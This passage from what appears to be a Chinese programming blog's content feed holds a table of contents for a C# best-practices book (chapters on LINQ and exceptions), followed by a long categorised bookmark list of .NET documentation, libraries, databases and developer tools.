id="第27条：只把必备的契约定义在接口中，把其他功能留给扩展方法去实现"><a href="#第27条：只把必备的契约定义在接口中，把其他功能留给扩展方法去实现" class="headerlink" title="第27条：只把必备的契约定义在接口中，把其他功能留给扩展方法去实现"></a>第27条：只把必备的契约定义在接口中，把其他功能留给扩展方法去实现</h3><h3 id="第28条：考虑通过扩展方法增强已构造类型的功能"><a href="#第28条：考虑通过扩展方法增强已构造类型的功能" class="headerlink" title="第28条：考虑通过扩展方法增强已构造类型的功能"></a>第28条：考虑通过扩展方法增强已构造类型的功能</h3><hr>
<h2 id="第4章-合理地运用-LINQ"><a href="#第4章-合理地运用-LINQ" class="headerlink" title="第4章 合理地运用 LINQ"></a>第4章 合理地运用 LINQ</h2><h3 id="第29条：优先考虑提供迭代器方法，而不要返回集合"><a href="#第29条：优先考虑提供迭代器方法，而不要返回集合" class="headerlink" title="第29条：优先考虑提供迭代器方法，而不要返回集合"></a>第29条：优先考虑提供迭代器方法，而不要返回集合</h3><h3 id="第30条：优先考虑通过查询语句来编写代码，而不要使用循环语句"><a href="#第30条：优先考虑通过查询语句来编写代码，而不要使用循环语句" class="headerlink" title="第30条：优先考虑通过查询语句来编写代码，而不要使用循环语句"></a>第30条：优先考虑通过查询语句来编写代码，而不要使用循环语句</h3><h3 id="第31条：把针对序列的-API-设计得更加易于拼接"><a href="#第31条：把针对序列的-API-设计得更加易于拼接" class="headerlink" title="第31条：把针对序列的 API 设计得更加易于拼接"></a>第31条：把针对序列的 API 设计得更加易于拼接</h3><h3 id="第32条：将迭代逻辑与操作、谓词及函数解耦"><a href="#第32条：将迭代逻辑与操作、谓词及函数解耦" class="headerlink" title="第32条：将迭代逻辑与操作、谓词及函数解耦"></a>第32条：将迭代逻辑与操作、谓词及函数解耦</h3><h3 id="第33条：等真正用到序列中的元素时再去生成"><a href="#第33条：等真正用到序列中的元素时再去生成" class="headerlink" title="第33条：等真正用到序列中的元素时再去生成"></a>第33条：等真正用到序列中的元素时再去生成</h3><h3 id="第34条：考虑通过函数参数来放松耦合关系"><a href="#第34条：考虑通过函数参数来放松耦合关系" class="headerlink" title="第34条：考虑通过函数参数来放松耦合关系"></a>第34条：考虑通过函数参数来放松耦合关系</h3><h3 id="第35条：绝对不要重载扩展方法"><a href="#第35条：绝对不要重载扩展方法" class="headerlink" title="第35条：绝对不要重载扩展方法"></a>第35条：绝对不要重载扩展方法</h3><h3 id="第36条：理解查询表达式与方法调用之间的映射关系"><a href="#第36条：理解查询表达式与方法调用之间的映射关系" class="headerlink" title="第36条：理解查询表达式与方法调用之间的映射关系"></a>第36条：理解查询表达式与方法调用之间的映射关系</h3><h3 id="第37条：尽量采用惰性求值的方式来查询，而不要及早求值"><a href="#第37条：尽量采用惰性求值的方式来查询，而不要及早求值" class="headerlink" title="第37条：尽量采用惰性求值的方式来查询，而不要及早求值"></a>第37条：尽量采用惰性求值的方式来查询，而不要及早求值</h3><h3 id="第38条：考虑用-lambda-表达式来代替方法"><a href="#第38条：考虑用-lambda-表达式来代替方法" class="headerlink" title="第38条：考虑用 lambda 表达式来代替方法"></a>第38条：考虑用 lambda 表达式来代替方法</h3><h3 id="第39条：不要在-Func-与-Action-中抛出异常"><a href="#第39条：不要在-Func-与-Action-中抛出异常" class="headerlink" title="第39条：不要在 Func 与 Action 中抛出异常"></a>第39条：不要在 Func 与 Action 中抛出异常</h3><h3 id="第40条：掌握尽早执行与延迟执行之间的区别"><a href="#第40条：掌握尽早执行与延迟执行之间的区别" class="headerlink" title="第40条：掌握尽早执行与延迟执行之间的区别"></a>第40条：掌握尽早执行与延迟执行之间的区别</h3><h3 id="第41条：不要把开销较大的资源捕获到闭包中"><a href="#第41条：不要把开销较大的资源捕获到闭包中" class="headerlink" title="第41条：不要把开销较大的资源捕获到闭包中"></a>第41条：不要把开销较大的资源捕获到闭包中</h3><h3 id="第42条：注意-IEnumerable-与-IQueryable-形式的数据源之间的区别"><a href="#第42条：注意-IEnumerable-与-IQueryable-形式的数据源之间的区别" class="headerlink" title="第42条：注意 IEnumerable 与 IQueryable 形式的数据源之间的区别"></a>第42条：注意 IEnumerable 与 IQueryable 形式的数据源之间的区别</h3><h3 id="第43条：用-Single-及-First-来明确地验证你对查询结果所做的假设"><a href="#第43条：用-Single-及-First-来明确地验证你对查询结果所做的假设" class="headerlink" title="第43条：用 Single() 及 First() 来明确地验证你对查询结果所做的假设"></a>第43条：用 Single() 及 First() 来明确地验证你对查询结果所做的假设</h3><h3 id="第44条：不要修改绑定变量"><a href="#第44条：不要修改绑定变量" class="headerlink" title="第44条：不要修改绑定变量"></a>第44条：不要修改绑定变量</h3><hr>
<h2 id="第5章-合理地运用异常"><a href="#第5章-合理地运用异常" class="headerlink" title="第5章 合理地运用异常"></a>第5章 合理地运用异常</h2><h3 id="第45条：考虑在方法约定遭到违背时抛出异常"><a href="#第45条：考虑在方法约定遭到违背时抛出异常" class="headerlink" title="第45条：考虑在方法约定遭到违背时抛出异常"></a>第45条：考虑在方法约定遭到违背时抛出异常</h3><h3 id="第46条：利用-using-及-try-finally-来清理资源"><a href="#第46条：利用-using-及-try-finally-来清理资源" class="headerlink" title="第46条：利用 using 及 try / finally 来清理资源"></a>第46条：利用 using 及 try / finally 来清理资源</h3><h3 id="第47条：专门针对应用程序创建异常"><a href="#第47条：专门针对应用程序创建异常" class="headerlink" title="第47条：专门针对应用程序创建异常"></a>第47条：专门针对应用程序创建异常</h3><h3 id="第48条：优先考虑做出强异常保证"><a href="#第48条：优先考虑做出强异常保证" class="headerlink" title="第48条：优先考虑做出强异常保证"></a>第48条：优先考虑做出强异常保证</h3><h3 id="第49条：考虑用异常筛选器来改写先捕获异常再重新抛出的逻辑"><a href="#第49条：考虑用异常筛选器来改写先捕获异常再重新抛出的逻辑" class="headerlink" title="第49条：考虑用异常筛选器来改写先捕获异常再重新抛出的逻辑"></a>第49条：考虑用异常筛选器来改写先捕获异常再重新抛出的逻辑</h3><h3 id="第50条：合理利用异常筛选器的副作用来实现某些效果"><a href="#第50条：合理利用异常筛选器的副作用来实现某些效果" class="headerlink" title="第50条：合理利用异常筛选器的副作用来实现某些效果"></a>第50条：合理利用异常筛选器的副作用来实现某些效果</h3><hr>
<h2 id="中英文词汇对照表"><a href="#中英文词汇对照表" class="headerlink" title="中英文词汇对照表"></a>中英文词汇对照表</h2>]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[网页书签]]></title>
      <url>/2019/08/30/Bookmarks/</url>
      <content type="html"><![CDATA[<p>&emsp; </p>
<a id="more"></a>

<p><a href="https://tao-lol.top/">tao-lol</a></p>
<h1 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h1><p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/index" target="_blank" rel="noopener">.NET API 浏览器</a><br><a href="https://www.nuget.org/" target="_blank" rel="noopener">Nuget Gallery</a>  </p>
<h2 id="在线编译"><a href="#在线编译" class="headerlink" title="在线编译"></a>在线编译</h2><p><a href="https://try.dot.net/" target="_blank" rel="noopener">try.dot.net</a><br><a href="https://dotnetfiddle.net/" target="_blank" rel="noopener">.NET Fiddle</a>  </p>
<h2 id="微软官方文档"><a href="#微软官方文档" class="headerlink" title="微软官方文档"></a>微软官方文档</h2><p><a href="https://docs.microsoft.com/zh-cn/dotnet/" target="_blank" rel="noopener">.NET</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/" target="_blank" rel="noopener">.NET Standard</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/" target="_blank" rel="noopener">.NET Framework</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/core/" target="_blank" rel="noopener">.NET Core</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/" target="_blank" rel="noopener">C#</a><br><a href="https://docs.microsoft.com/zh-cn/aspnet/core/" target="_blank" rel="noopener">ASP.NET Core</a><br><a href="https://docs.microsoft.com/zh-cn/aspnet/core/razor-pages/" target="_blank" rel="noopener">Razor Pages</a><br><a href="https://docs.microsoft.com/zh-cn/aspnet/core/mvc/" target="_blank" rel="noopener">MVC</a><br><a href="https://docs.microsoft.com/zh-cn/aspnet/core/blazor/" target="_blank" rel="noopener">Blazor</a><br><a href="https://docs.microsoft.com/zh-cn/aspnet/core/web-api/" target="_blank" rel="noopener">Web API</a><br><a href="https://docs.microsoft.com/zh-cn/aspnet/core/signalr/" target="_blank" rel="noopener">SignalR</a><br><a href="https://docs.microsoft.com/zh-cn/aspnet/core/grpc/" target="_blank" rel="noopener">gRPC</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/wpf/" target="_blank" rel="noopener">WPF</a><br><a href="https://docs.microsoft.com/zh-cn/xamarin/" target="_blank" rel="noopener">Xamarin</a><br><a href="https://github.com/dotnet/maui" target="_blank" rel="noopener">MAUI</a><br><a href="https://docs.microsoft.com/zh-cn/ef/core/" target="_blank" rel="noopener">Entity Framework Core</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/machine-learning/" target="_blank" rel="noopener">ML.NET</a><br><a href="https://github.com/microsoft/api-guidelines/blob/vNext/Guidelines.md" target="_blank" rel="noopener">Microsoft REST API Guidelines</a><br><a href="https://docs.microsoft.com/zh-cn/azure/devops/" target="_blank" rel="noopener">Azure Devops</a><br><a href="https://docs.microsoft.com/en-us/azure/architecture/" target="_blank" rel="noopener">Azure Architecture</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/architecture/microservices/" target="_blank" rel="noopener">MicroServices</a><br><a href="https://github.com/dotnet-architecture/eShopOnContainers" target="_blank" rel="noopener">eShopOnContainers</a><br><a href="https://github.com/dotnet-architecture/eShopOnWeb" target="_blank" rel="noopener">eShopOnWeb</a><br><a href="https://www.microsoft.com/design/" target="_blank" rel="noopener">Microsoft Design</a><br><a href="https://github.com/microsoft/ProjectReunion" target="_blank" rel="noopener">Project Reunion</a><br><a href="https://github.com/dotnet/tye" target="_blank" rel="noopener">Tye</a><br><a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/" target="_blank" rel="noopener">WinDbg</a>  </p>
<h2 id="第三方组件"><a href="#第三方组件" class="headerlink" title="第三方组件"></a>第三方组件</h2><p><a href="https://shields.io/" target="_blank" rel="noopener">Shields.io: Quality metadata badges for open source projects</a><br><a href="https://wiki.js.org/" target="_blank" rel="noopener">Wiki.js</a>  </p>
<h3 id="代码增强"><a href="#代码增强" class="headerlink" title="代码增强"></a>代码增强</h3><p><a href="https://github.com/codecadwallader/codemaid" target="_blank" rel="noopener">CodeMaid</a><br><a href="https://github.com/App-vNext/Polly/wiki" target="_blank" rel="noopener">Polly</a><br><a href="https://fluentvalidation.net/start" target="_blank" rel="noopener">FluentValidation</a><br><a href="https://github.com/scottksmith95/LINQKit" target="_blank" rel="noopener">LINQKit</a><br><a href="https://github.com/morelinq/MoreLINQ" target="_blank" rel="noopener">MoreLINQ</a><br><a href="https://github.com/zmjack/LinqSharp" target="_blank" rel="noopener">LinqSharp</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.dynamic.expandoobject" target="_blank" rel="noopener">ExpandoObject</a><br><a href="https://github.com/StefH/System.Linq.Dynamic.Core" target="_blank" rel="noopener">System.Linq.Dynamic.Core</a><br><a href="https://github.com/davideicardi/DynamicExpresso" target="_blank" rel="noopener">Dynamic Expresso</a><br><a href="https://github.com/newbe36524/Newbe.ObjectVisitor" target="_blank" rel="noopener">Newbe.ObjectVisitor</a><br><a href="https://github.com/1996v/Bssom.Net" target="_blank" rel="noopener">Bssom.Net</a><br><a href="https://github.com/Jimmey-Jiang/Common.Utility" target="_blank" rel="noopener">Common.Utility</a><br><a href="https://github.com/WeihanLi/WeihanLi.Common/" target="_blank" rel="noopener">WeihanLi.Common</a><br><a href="https://github.com/XiLife-OSPC/Masuit.Tools" target="_blank" rel="noopener">Masuit.Tools</a><br><a href="https://github.com/dotnetcore/FlubuCore" target="_blank" rel="noopener">FlubuCore</a><br><a href="https://github.com/dotnetcore/Natasha" target="_blank" rel="noopener">Natasha</a><br><a href="https://github.com/peachpiecompiler/peachpie" target="_blank" rel="noopener">PeachPie</a><br><a href="https://www.mathdotnet.com/" target="_blank" rel="noopener">Math.NET</a><br><a href="https://github.com/castleproject/Core" target="_blank" rel="noopener">Castle Core</a><br><a href="https://github.com/zhm-real/PathPlanning" target="_blank" rel="noopener">PathPlanning</a>  </p>
<h4 id="功能开关"><a href="#功能开关" class="headerlink" title="功能开关"></a>功能开关</h4><p><a href="https://github.com/microsoft/FeatureManagement-Dotnet" target="_blank" rel="noopener">FeatureManagement</a>  </p>
<h4 id="信息过滤"><a href="#信息过滤" class="headerlink" title="信息过滤"></a>信息过滤</h4><p><a href="https://github.com/toolgood/ToolGood.Words" target="_blank" rel="noopener">ToolGood.Words</a>  </p>
<h3 id="ID生成"><a href="#ID生成" class="headerlink" title="ID生成"></a>ID生成</h3><h4 id="无序"><a href="#无序" class="headerlink" title="无序"></a>无序</h4><p><a href="https://github.com/bolorundurowb/shortid" target="_blank" rel="noopener">ShortId</a><br><a href="https://github.com/jasonholloway/miniguid" target="_blank" rel="noopener">MiniGuid</a>  </p>
<h4 id="有序"><a href="#有序" class="headerlink" title="有序"></a>有序</h4><p><a href="https://github.com/Coldairarrow/IdHelper" target="_blank" rel="noopener">IdHelper</a><br>⭐推荐：<a href="https://github.com/stulzq/snowflake-net" target="_blank" rel="noopener">SnowFlake-NET</a><br>⭐推荐：<a href="https://github.com/buvinghausen/SequentialGuid" target="_blank" rel="noopener">SequentialGuid</a>  </p>
<h3 id="图像音频视频"><a href="#图像音频视频" class="headerlink" title="图像音频视频"></a>图像音频视频</h3><p><a href="https://trac.ffmpeg.org/" target="_blank" rel="noopener">FFmpeg</a><br><a href="https://github.com/rosenbjerg/FFMpegCore" target="_blank" rel="noopener">FFMpegCore</a><br><a href="https://github.com/videolan/libvlcsharp" target="_blank" rel="noopener">LibVLCSharp</a><br><a href="https://github.com/dlemstra/Magick.NET" target="_blank" rel="noopener">Magick</a><br><a href="https://github.com/JimBobSquarePants/ImageProcessor" target="_blank" rel="noopener">ImageProcessor</a><br><a href="https://github.com/SixLabors/ImageSharp" target="_blank" rel="noopener">ImageSharp</a><br><a href="https://github.com/vvvv/SVG" target="_blank" rel="noopener">SVG.NET</a>  </p>
<h3 id="网络服务"><a href="#网络服务" class="headerlink" title="网络服务"></a>网络服务</h3><p><a href="http://docs.supersocket.net/" target="_blank" rel="noopener">SuperSocket</a><br><a href="https://github.com/tusdotnet/tusdotnet" target="_blank" rel="noopener">tusdotnet</a><br><a href="https://github.com/dotnetcore/WebApiClient" target="_blank" rel="noopener">WebApiClient</a><br><a href="https://github.com/Azure/DotNetty" target="_blank" rel="noopener">DotNetty</a>  </p>
<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p><a href="https://github.com/jstedfast/MailKit" target="_blank" rel="noopener">MailKit</a><br><a href="https://github.com/lukencode/FluentEmail" target="_blank" rel="noopener">FluentEmail</a><br><a href="https://github.com/xfrogcn/Xfrogcn.PluginFactory" target="_blank" rel="noopener">Xfrogcn.PluginFactory</a>  </p>
<h3 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h3><p><a href="https://oauth.net/2/" target="_blank" rel="noopener">OAuth 2.0</a><br><a href="https://openid.net/developers/specs/" target="_blank" rel="noopener">OpenID</a><br><a href="https://jwt.io/" target="_blank" rel="noopener">JWT</a><br><a href="docs.identityserver.io/">IdentityServer4</a><br><a href="https://identitymodel.readthedocs.io/" target="_blank" rel="noopener">IdentityModel</a><br><a href="https://github.com/openiddict/openiddict-core" target="_blank" rel="noopener">OpenIddict</a>  </p>
<h3 id="应用程序接口（API）"><a href="#应用程序接口（API）" class="headerlink" title="应用程序接口（API）"></a>应用程序接口（API）</h3><p><a href="https://www.odata.org/documentation/" target="_blank" rel="noopener">OData</a><br><a href="https://spring.io/projects/spring-hateoas" target="_blank" rel="noopener">Spring HATEOAS</a><br><a href="https://json-schema.org/" target="_blank" rel="noopener">JSON Schema</a><br><a href="https://swagger.io/docs/" target="_blank" rel="noopener">Swagger</a><br><a href="http://editor.swagger.io/" target="_blank" rel="noopener">Swagger Editor</a><br><a href="https://github.com/domaindrivendev/Swashbuckle" target="_blank" rel="noopener">SwashBuckle</a><br><a href="https://github.com/RicoSuter/NSwag/wiki" target="_blank" rel="noopener">NSwag</a><br><a href="https://ocelot.readthedocs.io/" target="_blank" rel="noopener">Ocelot</a><br><a href="https://github.com/envoyproxy/envoy" target="_blank" rel="noopener">Envoy</a><br><a href="https://github.com/microsoft/reverse-proxy" target="_blank" rel="noopener">YARP</a><br><a href="https://github.com/IKende/Bumblebee" target="_blank" rel="noopener">Bumblebee</a><br><a href="https://github.com/reactiveui/refit" target="_blank" rel="noopener">Refit</a><br><a href="https://github.com/graphql-dotnet/graphql-dotnet" target="_blank" rel="noopener">GraphQL</a><br><a href="https://github.com/microsoft/vs-streamjsonrpc" target="_blank" rel="noopener">StreamJsonRpc</a><br><a href="https://github.com/restsharp/RestSharp" target="_blank" rel="noopener">RestSharp</a><br>🚫<a href="https://github.com/stefanprodan/AspNetCoreRateLimit/wiki" target="_blank" rel="noopener">AspNetCoreRateLimit</a>  </p>
<h4 id="Hateoas"><a href="#Hateoas" class="headerlink" title="Hateoas"></a>Hateoas</h4><p><a href="https://github.com/riskfirst/riskfirst.hateoas" target="_blank" rel="noopener">RiskFirst.Hateoas</a><br><a href="https://github.com/higtrollers/Sciensoft.Hateoas" target="_blank" rel="noopener">Sciensoft.Hateoas</a>  </p>
<h4 id="ASP-NET-Core-缓存"><a href="#ASP-NET-Core-缓存" class="headerlink" title="ASP.NET Core 缓存"></a>ASP.NET Core 缓存</h4><p><a href="https://www.nuget.org/packages/Marvin.Cache.Headers" target="_blank" rel="noopener">Marvin.Cache.Headers</a><br><a href="https://github.com/aliostad/CacheCow/" target="_blank" rel="noopener">CacheCow</a><br><a href="https://docs.microsoft.com/zh-cn/aspnet/core/performance/caching/memory" target="_blank" rel="noopener">内存中缓存</a><br><a href="https://docs.microsoft.com/zh-cn/aspnet/core/performance/caching/distributed" target="_blank" rel="noopener">分布式缓存</a><br><a href="https://docs.microsoft.com/zh-cn/aspnet/core/performance/caching/middleware" target="_blank" rel="noopener">响应缓存中间件</a>  </p>
<h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><p><a href="https://github.com/jbogard/MediatR/wiki" target="_blank" rel="noopener">MediatR</a><br><a href="https://github.com/dotnet-state-machine/stateless" target="_blank" rel="noopener">Stateless</a><br><a href="https://github.com/MassTransit/Automatonymous" target="_blank" rel="noopener">Automatonymous</a>  </p>
<h3 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h3><p><a href="https://github.com/khellang/Scrutor" target="_blank" rel="noopener">Scrutor</a><br><a href="https://www.nuget.org/packages/Microsoft.Extensions.DependencyInjection" target="_blank" rel="noopener">Microsoft.Extensions.DependencyInjection</a><br><a href="https://autofac.readthedocs.io/" target="_blank" rel="noopener">Autofac</a><br><a href="http://unitycontainer.org/" target="_blank" rel="noopener">Unity</a><br><a href="https://github.com/ninject/Ninject" target="_blank" rel="noopener">Ninject</a><br><a href="https://www.postsharp.net/" target="_blank" rel="noopener">PostSharp</a>  </p>
<h3 id="规则引擎"><a href="#规则引擎" class="headerlink" title="规则引擎"></a>规则引擎</h3><p><a href="https://github.com/NRules/NRules" target="_blank" rel="noopener">NRules</a>  </p>
<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><p><a href="https://www.sqlite.org/docs.html" target="_blank" rel="noopener">SQLite</a><br><a href="https://dev.mysql.com/doc/" target="_blank" rel="noopener">MySQL</a><br><a href="https://docs.microsoft.com/zh-cn/sql/sql-server/" target="_blank" rel="noopener">SQL Server</a><br><a href="https://docs.oracle.com/en/database/" target="_blank" rel="noopener">Oracle</a>  </p>
<h4 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h4><p><a href="https://github.com/mbdavid/litedb" target="_blank" rel="noopener">LiteDB</a><br><a href="https://github.com/symisc/unqlite" target="_blank" rel="noopener">UnQLite</a><br><a href="https://redis.io/documentation" target="_blank" rel="noopener">Redis</a><br><a href="https://docs.mongodb.com/" target="_blank" rel="noopener">mongoDB</a><br><a href="https://github.com/google/leveldb" target="_blank" rel="noopener">LevelDB</a><br><a href="https://github.com/Microsoft/FASTER/" target="_blank" rel="noopener">FASTER</a><br><a href="https://github.com/ideawu/ssdb" target="_blank" rel="noopener">SSDB</a><br><a href="https://rocksdb.org/" target="_blank" rel="noopener">RocksDB</a><br><a href="https://couchdb.apache.org/" target="_blank" rel="noopener">CouchDB</a><br><a href="https://github.com/apache/hbase" target="_blank" rel="noopener">HBase</a><br><a href="https://github.com/ClickHouse/ClickHouse" target="_blank" rel="noopener">ClickHouse</a><br><a href="https://github.com/Alachisoft/NCache" target="_blank" rel="noopener">NCache</a>  </p>
<h4 id="数据库模型建模"><a href="#数据库模型建模" class="headerlink" title="数据库模型建模"></a>数据库模型建模</h4><p><a href="https://github.com/405go/pdman" target="_blank" rel="noopener">PDMan</a>  </p>
<h4 id="数据库增强"><a href="#数据库增强" class="headerlink" title="数据库增强"></a>数据库增强</h4><p><a href="https://github.com/dotnetcore/EasyCaching" target="_blank" rel="noopener">EasyCaching</a><br><a href="https://github.com/RedBeardLab/rediSQL" target="_blank" rel="noopener">RediSQL</a><br><a href="https://github.com/RedisBloom/RedisBloom" target="_blank" rel="noopener">RedisBloom</a><br><a href="https://github.com/borisdj/EFCore.BulkExtensions" target="_blank" rel="noopener">EFCore.BulkExtensions</a>  </p>
<h4 id="数据库连接管理工具"><a href="#数据库连接管理工具" class="headerlink" title="数据库连接管理工具"></a>数据库连接管理工具</h4><p><a href="https://docs.microsoft.com/en-us/sql/ssms/sql-server-management-studio-ssms" target="_blank" rel="noopener">SQL Server Management Studio(SSMS)</a><br><a href="https://www.mysql.com/products/workbench/" target="_blank" rel="noopener">MySQL Workbench</a><br><a href="https://sqlitebrowser.org/" target="_blank" rel="noopener">SQLite Database Browser</a><br><a href="https://www.sqlitestudio.pl/" target="_blank" rel="noopener">SQLiteStudio</a><br><a href="https://www.mongodb.com/products/compass" target="_blank" rel="noopener">MongoDB Compass</a><br><a href="https://github.com/RenzHoly/Mongood" target="_blank" rel="noopener">Mongood</a><br><a href="https://github.com/mylxsw/redis-tui" target="_blank" rel="noopener">redis-Tui</a><br><a href="https://github.com/uglide/RedisDesktopManager" target="_blank" rel="noopener">Redis Desktop Manager</a><br><a href="https://github.com/dbeaver/dbeaver" target="_blank" rel="noopener">DBeaver</a><br><a href="https://github.com/plotly/falcon" target="_blank" rel="noopener">Falcon</a><br><a href="https://github.com/beekeeper-studio/beekeeper-studio" target="_blank" rel="noopener">Beekeeper Studio</a>  </p>
<h3 id="对象关系映射（ORM）"><a href="#对象关系映射（ORM）" class="headerlink" title="对象关系映射（ORM）"></a>对象关系映射（ORM）</h3><p><a href="https://github.com/MapsterMapper/Mapster" target="_blank" rel="noopener">Mapster</a><br><a href="docs.automapper.org/">AutoMapper</a><br><a href="https://github.com/CollaboratingPlatypus/PetaPoco" target="_blank" rel="noopener">PetaPoco</a><br><a href="https://github.com/2881099/FreeSql/wiki" target="_blank" rel="noopener">FreeSql</a><br><a href="https://github.com/StackExchange/Dapper" target="_blank" rel="noopener">Dapper</a><br><a href="https://github.com/md-frank/DapperPoco" target="_blank" rel="noopener">DapperPoco</a><br><a href="https://github.com/ericdc1/Dapper.SimpleCRUD" target="_blank" rel="noopener">Dapper.SimpleCRUD</a><br><a href="https://github.com/2881099/csredis" target="_blank" rel="noopener">CSRedis</a><br><a href="https://github.com/2881099/FreeRedis" target="_blank" rel="noopener">FreeRedis</a><br><a href="https://stackexchange.github.io/StackExchange.Redis/" target="_blank" rel="noopener">StackExchange.Redis</a><br><a href="https://docs.mongodb.com/ecosystem/drivers/csharp/" target="_blank" rel="noopener">MongoDB.Driver</a><br><a href="https://github.com/sdcb/sdmap" target="_blank" rel="noopener">sdmap</a><br><a href="https://github.com/1448376744/SqlBatis" target="_blank" rel="noopener">SqlBatis</a><br><a href="https://github.com/dotnet/spark" target="_blank" rel="noopener">.NET for Apache® Spark™</a><br><a href="https://github.com/overtly/core-data" target="_blank" rel="noopener">Overt.Core.Data</a><br><a href="https://github.com/sunkaixuan/SqlSugar" target="_blank" rel="noopener">SqlSugar</a><br><a href="https://github.com/killwort/ClickHouse-Net" target="_blank" rel="noopener">ClickHouse.ADO</a>  </p>
<h3 id="导入导出格式文件"><a href="#导入导出格式文件" class="headerlink" title="导入导出格式文件"></a>导入导出格式文件</h3><p><a href="https://github.com/JanKallman/EPPlus/wiki" target="_blank" rel="noopener">EPPlus</a><br><a href="https://github.com/xceedsoftware/DocX" target="_blank" rel="noopener">DocX</a><br><a href="https://joshclose.github.io/CsvHelper/getting-started" target="_blank" rel="noopener">CSVHelper</a><br><a href="https://www.newtonsoft.com/json/help/" target="_blank" rel="noopener">Json.NET</a><br><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to" target="_blank" rel="noopener">System.Text.Json</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.xml.xmlreader" target="_blank" rel="noopener">XmlReader</a><br><a href="https://docs.microsoft.com/en-us/dotnet/api/system.xml.xmlwriter" target="_blank" rel="noopener">XmlWriter</a><br><a href="https://github.com/rdvojmoc/DinkToPdf" target="_blank" rel="noopener">DinkToPdf</a><br><a href="https://github.com/dotnetcore/Magicodes.IE" target="_blank" rel="noopener">Magicodes.IE</a><br><a href="https://github.com/lunet-io/scriban" target="_blank" rel="noopener">Scriban</a><br><a href="https://selectpdf.com/community-edition/" target="_blank" rel="noopener">SelectPDF</a><br><a href="https://github.com/fpanaccia/Wkhtmltopdf.NetCore" target="_blank" rel="noopener">Wkhtmltopdf.NetCore</a>  </p>
<h4 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h4><p><a href="https://github.com/codebude/QRCoder" target="_blank" rel="noopener">QRCoder</a>  </p>
<h4 id="条形码"><a href="#条形码" class="headerlink" title="条形码"></a>条形码</h4><p><a href="https://github.com/barnhill/barcodelib" target="_blank" rel="noopener">barcodelib</a>  </p>
<h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><p><a href="https://anglesharp.github.io/docs.html" target="_blank" rel="noopener">AngleSharp</a><br><a href="https://github.com/hardkoded/puppeteer-sharp" target="_blank" rel="noopener">Puppeteer Sharp</a><br><a href="https://github.com/zzzprojects/html-agility-pack" target="_blank" rel="noopener">Html Agility Pack</a><br><a href="https://github.com/dotnetcore/DotnetSpider" target="_blank" rel="noopener">DotnetSpider</a>  </p>
<h3 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h3><p><a href="https://github.com/dlemstra/Magick.NET" target="_blank" rel="noopener">ImageMagick</a><br><a href="https://github.com/danielgatis/rembg" target="_blank" rel="noopener">Rembg</a>  </p>
<h3 id="全文索引"><a href="#全文索引" class="headerlink" title="全文索引"></a>全文索引</h3><p><a href="https://github.com/apache/lucenenet" target="_blank" rel="noopener">Lucene.NET</a><br><a href="https://github.com/meilisearch/MeiliSearch" target="_blank" rel="noopener">MeiliSearch</a>  </p>
<h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><p><a href="https://github.com/henkmollema/CryptoHelper" target="_blank" rel="noopener">CryptoHelper</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.security.cryptography" target="_blank" rel="noopener">System.Security.Cryptography</a>  </p>
<h3 id="后台任务"><a href="#后台任务" class="headerlink" title="后台任务"></a>后台任务</h3><p><a href="https://www.quartz-scheduler.net/documentation/index.html" target="_blank" rel="noopener">Quartz.NET</a><br><a href="docs.topshelf-project.com/">Topshelf</a><br><a href="https://docs.hangfire.io/" target="_blank" rel="noopener">Hangfire</a><br><a href="https://github.com/hey-hoho/ScheduleMasterCore" target="_blank" rel="noopener">ScheduleMaster</a><br><a href="https://github.com/NewLifeX/AntJob" target="_blank" rel="noopener">AntJob</a>  </p>
<h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><p><a href="https://www.rabbitmq.com/documentation.html" target="_blank" rel="noopener">RabbitMQ</a><br><a href="https://github.com/EasyNetQ/EasyNetQ/wiki/Introduction" target="_blank" rel="noopener">EasyNetQ</a><br><a href="https://masstransit-project.com/MassTransit/" target="_blank" rel="noopener">MassTransit</a><br><a href="https://github.com/apache/kafka" target="_blank" rel="noopener">Kafka</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.threading.channels" target="_blank" rel="noopener">System.Threading.Channels</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.messaging.messagequeue" target="_blank" rel="noopener">System.Messaging.MessageQueue</a>  </p>
<h3 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h3><p><a href="https://www.consul.io/docs/index.html" target="_blank" rel="noopener">Consul</a><br><a href="https://github.com/alibaba/nacos" target="_blank" rel="noopener">Nacos</a>  </p>
<h3 id="配置中心"><a href="#配置中心" class="headerlink" title="配置中心"></a>配置中心</h3><p><a href="https://github.com/ctripcorp/apollo/wiki" target="_blank" rel="noopener">Apollo</a><br><a href="https://github.com/kklldog/AgileConfig" target="_blank" rel="noopener">AgileConfig</a>  </p>
